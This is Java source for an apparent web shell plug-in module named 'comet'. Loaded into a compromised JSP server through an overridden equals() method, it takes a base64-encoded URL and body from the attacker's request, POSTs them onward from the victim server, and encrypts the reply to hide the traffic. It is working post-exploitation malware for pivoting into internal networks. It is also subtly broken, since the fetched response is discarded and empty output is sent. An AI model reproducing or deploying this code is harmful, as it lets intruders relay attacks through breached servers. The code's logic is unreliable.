import java.io.*;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class comet extends ClassLoader
{
    public comet(ClassLoader objParent) { super(objParent); }
    public comet() { super(comet.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult == null || abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    private byte[] http_post(String szUrl, String szData) throws Exception {
        byte[] postBytes = szData != null ? szData.getBytes(StandardCharsets.UTF_8) : new byte[0];
        return http_post_raw(szUrl, postBytes, "application/x-www-form-urlencoded");
    }

    private byte[] http_post(String szUrl, byte[] abData) throws Exception {
        return http_post_raw(szUrl, abData, "application/octet-stream");
    }

    private byte[] http_post_raw(String szUrl, byte[] postBytes, String contentType) throws Exception {
        HttpURLConnection connection = null;
        InputStream is = null;
        ByteArrayOutputStream baos = null;

        try {
            URL url = new URL(szUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);
            connection.setInstanceFollowRedirects(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            connection.setRequestProperty("Content-Type", contentType);

            if (postBytes != null && postBytes.length > 0) {
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Length", String.valueOf(postBytes.length));
                try (OutputStream os = connection.getOutputStream()) {
                    os.write(postBytes);
                }
            }

            int responseCode = connection.getResponseCode();
            
            if (responseCode >= 200 && responseCode < 400) {
                is = connection.getInputStream();
            } else {
                is = connection.getErrorStream();
            }

            if (is != null) {
                baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
                return baos.toByteArray();
            }
            return new byte[0];
        } finally {
            if (baos != null) try { baos.close(); } catch (Exception e) {}
            if (is != null) try { is.close(); } catch (Exception e) {}
            if (connection != null) connection.disconnect();
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;
        
        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
            Map<String, String> mapParams = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();
            
            String szURL = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8);
            
            byte[] decodedData = Base64.getDecoder().decode(mapParams.get("z1")); 
            boolean bIsBinary = new String(Base64.getDecoder().decode(mapParams.get("z2")), StandardCharsets.UTF_8).equalsIgnoreCase("binary");

            byte[] responseBytes;
            if (bIsBinary)
            {
                responseBytes = http_post(szURL, decodedData);
            }
            else
            {
                String szTextPayload = new String(decodedData, StandardCharsets.UTF_8);
                responseBytes = http_post(szURL, szTextPayload);
            }

            byte[] finalOutputBytes;
            if (bIsBinary)
            {
                String base64Result = Base64.getEncoder().encodeToString(responseBytes);
                finalOutputBytes = base64Result.getBytes(StandardCharsets.UTF_8);
            }
            else
            {
                finalOutputBytes = responseBytes;
            }

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));
                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}